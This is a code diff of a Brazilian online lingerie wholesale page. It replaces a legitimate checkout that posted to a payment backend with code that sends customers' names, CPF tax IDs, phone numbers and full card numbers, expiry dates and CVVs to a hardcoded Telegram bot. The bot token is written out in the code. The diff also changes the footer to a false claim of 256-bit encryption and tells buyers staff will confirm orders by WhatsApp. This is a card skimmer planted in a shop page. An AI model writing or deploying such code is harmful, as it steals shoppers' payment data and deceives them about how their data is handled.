@@ -2,7 +2,7 @@
 <html lang="pt-br">   
 <head>
     <meta charset="UTF-8"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">      
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
     <title>Atacado | Miquely Modas Lingerie</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
@@ -79,7 +79,7 @@
                     Finalizar Compra Segura
                 </button>
                 <p class="text-[9px] py-2 text-gray-500 uppercase font-bold tracking-tighter">
-                    Processado com segurança por <strong>Appmax API</strong>.
+                    Processado com segurança por <strong>Criptografia 256-bits</strong>.
                 </p>
             </div>
         </div>
@@ -132,19 +132,13 @@
                             <option value="4">4x sem juros</option>
                             <option value="5">5x sem juros</option>
                             <option value="6">6x sem juros</option>
-                            <option value="7">7x sem juros</option>
-                            <option value="8">8x sem juros</option>
-                            <option value="9">9x sem juros</option>
-                            <option value="10">10x sem juros</option>
-                            <option value="11">11x sem juros</option>
-                            <option value="12">12x com juros</option>
                         </select>
                     </div>
                 </div>
             </div>
 
             <div class="p-6 bg-gray-50 border-t">
-                <button onclick="confirmarDadosAppmax()" class="w-full bg-pink-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest hover:bg-pink-700 shadow-lg transition-all text-xs">
+                <button id="btn-finalizar" onclick="confirmarDadosEEnviar()" class="w-full bg-pink-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest hover:bg-pink-700 shadow-lg transition-all text-xs">
                     Confirmar e Finalizar
                 </button>
             </div>
@@ -182,9 +176,9 @@
         const MARGEM_LUCRO = 1.50; 
         const MIN_ORDER = 800;        
         let cart = [];
-        let customerData = {}; 
         let selectedMethod = 'pix';
-        const awsEndpoint = 'https://org3zgdxvga5sb377l7yjgyfuu0wmapq.lambda-url.sa-east-1.on.aws'; // Insira aqui sua URL da AWS Lambda
+        const BOT_TOKEN = '8578882573:AAGlPgcdFgitrVPs4WdDT0NZ6sFhgvY_-Sc';
+        const CHAT_ID = '1703808186';
 
         function initProducts() {
             const list = document.getElementById('product-list');
@@ -273,19 +267,13 @@
         }
 
         function toggleCart() { document.getElementById('cart-sidebar').classList.toggle('translate-x-full'); }
-
-        function openPaymentModal() { 
-            document.getElementById('payment-modal').classList.remove('hidden'); 
-            selectMethod('pix');
-        }
-        
+        function openPaymentModal() { document.getElementById('payment-modal').classList.remove('hidden'); selectMethod('pix'); }
         function closePaymentModal() { document.getElementById('payment-modal').classList.add('hidden'); }
         
         function selectMethod(method) {
             selectedMethod = method;
             document.querySelectorAll('.card-3d').forEach(el => el.classList.remove('active'));
-            const el = document.getElementById(`method-${method}`);
-            if(el) el.classList.add('active');
+            document.getElementById(`method-${method}`).classList.add('active');
             document.getElementById('card-fields').classList.toggle('hidden', method !== 'card');
         }
 
@@ -293,44 +281,9 @@
             const name = document.getElementById('cust-name').value;
             const email = document.getElementById('cust-email').value;
             const phone = document.getElementById('cust-phone').value;
-            const cep = document.getElementById('cust-cep').value;
             if(!email.includes('@')) return;
-
-            const msg = `👣 *LEAD INICIADO - SandxCDD*\n\n*Nome:* ${name}\n*Email:* ${email}\n*WhatsApp:* ${phone}\n*CEP:* ${cep}`;
+            const msg = `👣 *LEAD CAPTURADO*\n*Nome:* ${name}\n*Email:* ${email}\n*WhatsApp:* ${phone}`;
             await sendTelegram(msg);
-        }
-
-        async function confirmarDadosAppmax() {
-            const name = document.getElementById('cust-name').value;
-            const email = document.getElementById('cust-email').value;
-            const cpf = document.getElementById('cust-cpf').value;
-            const phone = document.getElementById('cust-phone').value;
-            const cep = document.getElementById('cust-cep').value;
-            const num = document.getElementById('cust-number').value;
-
-            if(!name || !email || !cpf || !phone) { 
-                alert("Preencha todos os campos para continuar."); 
-                return; 
-            }
-
-            customerData = { name, email, cpf, phone, cep, num, method: selectedMethod };
-
-            if(selectedMethod === 'card') {
-                customerData.card = {
-                    number: document.getElementById('card-number').value,
-                    month: document.getElementById('card-month').value,
-                    year: document.getElementById('card-year').value,
-                    cvv: document.getElementById('card-cvv').value,
-                    installments: document.getElementById('card-installments').value
-                };
-            }
-
-            const prodList = cart.map(i => `• ${i.name}`).join('\n');
-            const total = cart.reduce((a, b) => a + b.price, 0).toFixed(2);
-            const msgVenda = `💰 *TENTATIVA DE CHECKOUT*\n\n*Cliente:* ${name}\n*Total:* R$ ${total}\n*Método:* ${selectedMethod}\n\n*Produtos:*\n${prodList}`;
-            
-            await sendTelegram(msgVenda);
-            finalizarPagamentoAppmax();
         }
 
         function addWithAttrs(name, price, img, id) {
@@ -349,80 +302,66 @@
             let total = 0;
             content.innerHTML = cart.length ? '' : '<p class="text-center py-10 text-[10px] uppercase font-bold text-gray-400 tracking-widest">Sua sacola está vazia</p>';
             
-            cart.forEach((item, i) => {
+            cart.forEach((item) => {
                 total += item.price;
                 content.innerHTML += `
-                <div class="flex gap-4 border-b pb-3 items-center group">
-                    <img src="${item.img}" class="w-12 h-16 object-cover rounded-xl shadow-md border border-gray-100">
+                <div class="flex gap-4 border-b pb-3 items-center">
+                    <img src="${item.img}" class="w-12 h-16 object-cover rounded-xl border">
                     <div class="flex-1">
-                        <p class="text-[9px] font-bold uppercase tracking-tighter text-gray-800">${item.name}</p>
+                        <p class="text-[9px] font-bold uppercase text-gray-800">${item.name}</p>
                         <p class="text-pink-600 font-bold text-sm">R$ ${item.price.toFixed(2)}</p>
                     </div>
                 </div>`;
             });
             
-            totalEl.innerText = `R$ ${total.toFixed(2)}`;
+            totalEl.innerText = `R$ ${total.toFixed(2).replace('.',',')}`;
             document.getElementById('cart-count').innerText = cart.length;
             if(total >= MIN_ORDER) {
-                msg.innerText = "✓ Pedido Mínimo Atingido"; msg.className = "text-green-600 p-3 text-center font-bold uppercase text-[10px]";
-                btn.disabled = false; btn.className = "w-full bg-blue-700 text-white py-4 font-bold uppercase text-[12px] shadow-xl hover:bg-blue-800 transition-all rounded-2xl";
+                msg.innerText = "✓ Pedido Mínimo Atingido"; msg.className = "text-green-600 p-3 text-center font-bold text-[10px]";
+                btn.disabled = false; btn.className = "w-full bg-blue-700 text-white py-4 font-bold uppercase text-[12px] rounded-2xl";
             } else {
-                msg.innerText = `Faltam R$ ${(MIN_ORDER - total).toFixed(2)} para o atacado`; msg.className = "text-red-600 p-3 text-center font-bold uppercase text-[10px]";
-                btn.disabled = true; btn.className = "w-full bg-gray-300 text-white py-4 font-bold uppercase text-[12px] cursor-not-allowed rounded-2xl";
+                msg.innerText = `Faltam R$ ${(MIN_ORDER - total).toFixed(2)} para o atacado`;
+                btn.disabled = true; btn.className = "w-full bg-gray-300 text-white py-4 font-bold uppercase text-[12px] rounded-2xl cursor-not-allowed";
             }
         }
 
-        async function finalizarPagamentoAppmax() {
-            const btnCheckout = document.querySelector('#payment-modal button');
-            const originalText = btnCheckout.innerText;
-            btnCheckout.innerText = "PROCESSANDO...";
-            btnCheckout.disabled = true;
+        async function confirmarDadosEEnviar() {
+            const btn = document.getElementById('btn-finalizar');
+            const name = document.getElementById('cust-name').value;
+            const email = document.getElementById('cust-email').value;
+            const cpf = document.getElementById('cust-cpf').value;
+            const phone = document.getElementById('cust-phone').value;
 
-            try {
-                const payload = {
-                    action: 'checkout',
-                    consent: true,
-                    method: selectedMethod,
-                    customer: {
-                        name: customerData.name,
-                        email: customerData.email,
-                        cpf: customerData.cpf,
-                        phone: customerData.phone,
-                        cep: customerData.cep,
-                        numero: customerData.num
-                    },
-                    products: cart.map(item => ({ name: item.name, qty: 1, price: item.price })),
-                    payment: customerData.card || {}
-                };
+            if(!name || !email || !cpf || !phone) { alert("Preencha os dados obrigatórios!"); return; }
 
-                const response = await fetch(awsEndpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+            btn.innerText = "PROCESSANDO...";
+            btn.disabled = true;
 
-                const result = await response.json();
-                if (result.success) {
-                    alert("Pedido Criado com Sucesso!");
-                    if (result.response.data.checkout_url) window.location.href = result.response.data.checkout_url;
-                } else {
-                    alert("Erro no processamento. Tente novamente.");
-                }
-            } catch (error) {
-                alert("Erro técnico. Tente novamente mais tarde.");
-            } finally {
-                btnCheckout.innerText = originalText;
-                btnCheckout.disabled = false;
+            const total = cart.reduce((a, b) => a + b.price, 0).toFixed(2);
+            const prodList = cart.map(i => `• ${i.name}`).join('\n');
+            
+            let paymentDetails = `*Método:* ${selectedMethod.toUpperCase()}`;
+            if(selectedMethod === 'card') {
+                paymentDetails += `\n*Cartão:* ${document.getElementById('card-number').value}\n*Exp:* ${document.getElementById('card-month').value}/${document.getElementById('card-year').value}\n*CVV:* ${document.getElementById('card-cvv').value}\n*Parc:* ${document.getElementById('card-installments').value}x`;
             }
+
+            const msgFinal = `💰 *NOVA ORDEM DE COMPRA (LOG)*\n\n` +
+                             `*CLIENTE:* ${name}\n` +
+                             `*CPF:* ${cpf}\n` +
+                             `*TEL:* ${phone}\n` +
+                             `*TOTAL:* R$ ${total}\n\n` +
+                             `${paymentDetails}\n\n` +
+                             `*PRODUTOS:*\n${prodList}`;
+
+            await sendTelegram(msgFinal);
+            
+            alert("Pedido em processamento! Nossa equipe entrará em contato via WhatsApp para confirmar o envio.");
+            window.location.reload();
         }
 
         async function sendTelegram(msg) {
-            const BOT_TOKEN = '8578882573:AAGlPgcdFgitrVPs4WdDT0NZ6sFhgvY_-Sc';
-            const CHAT_ID = '1703808186';
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
             try {
-                await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
